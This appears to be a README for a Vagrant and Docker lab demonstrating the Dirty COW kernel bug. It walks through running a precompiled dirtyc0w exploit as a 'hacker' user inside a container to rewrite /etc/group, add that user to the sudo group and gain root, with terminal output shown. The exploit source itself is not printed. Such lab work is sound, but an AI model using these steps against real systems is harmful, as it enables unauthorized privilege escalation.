# Dirtyc0w Docker POC

```
Prerequisites:
- Vagrant installed

```

# How to use

Firstly 
``
git clone https://github.com/BrolyCode/Dirty-Cow.git && cd Dirty-Cow
``
Then run up the environment with the command
```
vagrant up
```
Once the server is built, we will ssh into it
```
vagrant ssh
```
change to the root user
```
sudo -i
```
The first container should be running as part of the build process, we can check this with
```
docker ps
```
You should get something like
```
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                         NAMES
db86f1c04483        scottyc/dirtyc0w    "nginx -g 'daemon off"   22 seconds ago      Up 19 seconds       0.0.0.0:80->80/tcp, 443/tcp   nginx
```
Now we can log on as the hacker 
```
docker exec -it -u hacker nginx bash
```
In the directory we are logged into we have the following files
```
drwxrwxrwt  2 root root  4096 Nov  26 11:10 .
drwxr-xr-x 41 root root  4096 Nov  26 11:10 ..
-rwxr-xr-x  1 root root  9880 Nov  26 04:52 dirtyc0w
-rwxrwxrwx  1 root root  9880 Nov  26 04:52 dirtyc0w.c
```
If we cat the file `/etc/group` we see
```
hacker@27862a2f9973:~$ cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:
....

We try to log in as root
```
sudo -i

```
We will now exploit the file `/etc/group`
```
./dirtyc0w 
```
It will print out the following to the terminal
```
mmap 7fd0facf4000

madvise 0

procselfmem 1500000000
```
Then we will cat `/etc/group` again
```
hacker@27862a2f9973:~$ cat /etc/group
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:hacker
...

Login as root
```
sudo -i




# Clean Up

Exit back to your host machines terminal and issue `vagrant destroy`
